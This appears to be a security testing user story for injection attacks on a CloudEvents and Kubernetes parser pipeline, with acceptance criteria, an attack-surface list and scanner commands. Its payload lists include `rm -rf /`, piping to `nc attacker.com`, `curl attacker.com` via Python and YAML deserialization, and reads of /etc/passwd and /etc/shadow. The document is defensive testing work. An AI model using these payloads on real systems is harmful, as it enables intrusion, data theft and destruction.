# SEC-002: Input Validation & Injection Attack Testing

**Priority**: P0 | **Status**: 📋 Backlog K  | **Story Points**: 13
**Linear URL**: https://linear.app/bvlucena/issue/BVL-244/sec-002-input-validation-and-injection-attack-testing

**Priority:** P0 | **Story Points:** 13

## 📋 User Story

**As a** Principal Pentester  
**I want to** validate that all user inputs are properly sanitized and validated  
**So that** injection attacks (SQL, Command, Code, YAML, Template) cannot compromise the system

## 🎯 Acceptance Criteria

### AC1: SQL Injection Prevention
**Given** the system may interact with databases  
**When** attempting SQL injection in all input fields  
**Then** all SQL injection attempts should be blocked

**Attack Vectors:**
- ❌ Classic SQL injection: `' OR '1'='1`
- ❌ Union-based injection: `' UNION SELECT * FROM users--`
- ❌ Time-based blind injection: `'; WAITFOR DELAY '00:00:10'--`
- ❌ Boolean-based blind injection: `' AND 1=1--`
- ❌ Error-based injection: `' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(...) ...`
- ❌ Second-order SQL injection

**Test Fields:**
- Parser ID
- Third Party ID
- Build context data
- Environment variables
- CloudEvent data fields

### AC2: Command Injection Prevention
**Given** the system may execute shell commands  
**When** attempting command injection in inputs  
**Then** all command injection attempts should be blocked

**Attack Scenarios:**
- ❌ Command chaining: `; rm -rf /`
- ❌ Command substitution: `$(whoami)`
- ❌ Backtick execution: `` `cat /etc/passwd` ``
- ❌ Pipe commands: ` | nc attacker.com 1234`
- ❌ Redirection attacks: `> /tmp/exploit.sh`
- ❌ Environment variable injection: `$PATH=/tmp:$PATH`

**Vulnerable Entry Points:**
- Docker build commands
- kubectl exec commands
- AWS CLI commands
- Git clone operations
- Script execution in containers

### AC3: Code Injection Prevention
**Given** parsers are dynamically loaded and executed  
**When** attempting code injection in parser files  
**Then** malicious code execution should be prevented

**Attack Vectors:**
- ❌ Python code injection: `__import__('os').system('curl attacker.com')`
- ❌ eval() injection: `eval('malicious_code')`
- ❌ exec() injection: `exec(open('/tmp/exploit').read())`
- ❌ pickle deserialization attack
- ❌ YAML deserialization attack: `!!python/object/apply:os.system`
- ❌ Template injection (Jinja2): `{{config.__class__.__init__.__globals__}}`

**Security Controls:**
- ✅ Parser sandboxing enforced
- ✅ No access to system modules
- ✅ File system access restricted
- ✅ Network access blocked
- ✅ Memory limits enforced

### AC4: YAML/JSON Injection Prevention
**Given** CloudEvents use JSON/YAML for data  
**When** attempting injection via malformed payloads  
**Then** parsing should fail safely

**Attack Scenarios:**
- ❌ Billion laughs attack (XML bomb equivalent)
- ❌ YAML anchor/alias abuse
- ❌ Recursive structure (JSON bomb)
- ❌ Type confusion attacks
- ❌ Schema validation bypass
- ❌ Deserialization gadget chains

**Test Payloads:**
```yaml
# Billion laughs
lol: &lol ["lol"]
lol2: *lol
lol3: [*lol2, *lol2, *lol2, *lol2, *lol2]
# ... recursive expansion

# Code execution
!!python/object/apply:os.system
args: ['curl http://attacker.com']
```

### AC5: Path Traversal Prevention
**Given** file paths are processed from user input  
**When** attempting directory traversal attacks  
**Then** access outside allowed directories should be blocked

**Attack Vectors:**
- ❌ Relative path traversal: `../../../etc/passwd`
- ❌ Absolute path: `/etc/shadow`
- ❌ URL-encoded traversal: `%2e%2e%2f%2e%2e%2f`
- ❌ Double-encoded: `%252e%252e%252f`
- ❌ Unicode bypass: `..%c0%af..%c0%af`
- ❌ Null byte injection: `../../../etc/passwd%00.txt`

**Vulnerable Parameters:**
- Source URL paths
- S3 bucket keys
- File upload destinations
- Log file paths
- Config file paths

### AC6: Template Injection Prevention
**Given** Kubernetes manifests are generated from templates  
**When** attempting server-side template injection  
**Then** template rendering should be secure

**Attack Scenarios:**
- ❌ Jinja2 SSTI: `{{7*7}}`, `{{config.__class__}}`
- ❌ Go template injection: `{{.}}`, `{{printf "%s" .}}`
- ❌ Helm template injection via values
- ❌ Variable expansion attacks: `${{secrets.GITHUB_TOKEN}}`
- ❌ Expression language injection: `${7*7}`

**Security Controls:**
- ✅ Template variable validation
- ✅ No user-controlled template strings
- ✅ Sandboxed template execution
- ✅ Whitelist allowed template functions

### AC7: LDAP/NoSQL Injection Prevention
**Given** the system may query external data stores  
**When** attempting LDAP or NoSQL injection  
**Then** queries should be parameterized and safe

**Attack Vectors:**
- ❌ LDAP injection: `*)(uid=*))( | (uid=*`
- ❌ MongoDB injection: `{"$ne": null}`
- ❌ Redis injection: `FLUSHALL\r\nGET key`
- ❌ Elasticsearch injection: `{"query":{"script":{"script":"..."}}}`

### AC8: Header Injection Prevention
**Given** HTTP headers may contain user input  
**When** attempting header injection attacks  
**Then** header manipulation should be blocked

**Attack Scenarios:**
- ❌ CRLF injection: `\r\nSet-Cookie: admin=true`
- ❌ HTTP response splitting
- ❌ Host header injection
- ❌ X-Forwarded-For spoofing
- ❌ Content-Type manipulation
- ❌ Cache poisoning via headers

## 🔴 Attack Surface Analysis

### Critical Input Entry Points

1. **CloudEvent Data Fields**
   ```json
   {
     "parser_id": "<INJECT HERE>",
     "third_party_id": "<INJECT HERE>",
     "source_url": "<INJECT HERE>",
     "build_args": {"key": "<INJECT HERE>"},
     "environment": {"ENV": "<INJECT HERE>"}
   }
   ```

2. **HTTP API Parameters**
   - Query parameters
   - POST body data
   - HTTP headers
   - File uploads

3. **Kubernetes Resources**
   - ConfigMap data
   - Secret data
   - Environment variables in pods
   - Volume mount paths

4. **External Data Sources**
   - S3 object keys
   - ECR image tags
   - Git repository URLs
   - Parser file contents

## 🛠️ Testing Tools

### Automated Testing
```bash
# SQL injection testing
sqlmap -u "http://api/endpoint" --data="param=test"

# Command injection
commix -u "http://api/endpoint" --data="param=test"

# XSS/injection scanner
nuclei -t /path/to/injection-templates -u http://api

# Fuzzing
ffuf -w /path/to/injection-payloads.txt \
  -u "http://api/endpoint" -d "param=FUZZ"
```

### Manual Testing Payloads
```bash
# SQL Injection payloads
' OR 1=1--
' UNION SELECT NULL--
' AND SLEEP(5)--

# Command Injection payloads
; whoami | whoami
`whoami`
$(whoami)

# Path Traversal payloads
../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc%252fpasswd

# Code Injection (Python)
__import__('os').system('id')
eval('__import__("os").system("id")')
exec('import socket,subprocess,os;...')

# YAML injection
!!python/object/apply:os.system
args: ['curl http://attacker.com/$(whoami)']
```

## 📊 Success Metrics

- **Zero** SQL injection vulnerabilities
- **Zero** command injection vulnerabilities
- **Zero** code execution vulnerabilities
- **100%** input validation coverage
- **100%** output encoding enforced

## 🚨 Incident Response

If injection vulnerability is discovered:

1. **Immediate** (< 5 min)
   - Block affected endpoint
   - Deploy WAF rules if available
   - Enable debug logging

2. **Short-term** (< 1 hour)
   - Patch vulnerability
   - Review all user inputs
   - Check for exploitation signs

3. **Long-term** (< 24 hours)
   - Code audit for similar issues
   - Implement input validation framework
   - Add automated security tests

## 📚 Related Stories

- **SEC-001:** Authentication & Authorization Bypass
- **SEC-003:** API Security & CORS Misconfiguration
- **SEC-006:** Secrets Exposure & Credential Leakage
- **SRE-014:** Security Incident Response

## 🔗 References

- [OWASP Injection Flaws](https://owasp.org/www-community/Injection_Flaws)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

**Test File:** `internal/security/security_002_injection_attacks_test.go`  
**Owner:** Security Team  
**Last Updated:** October 29, 2025

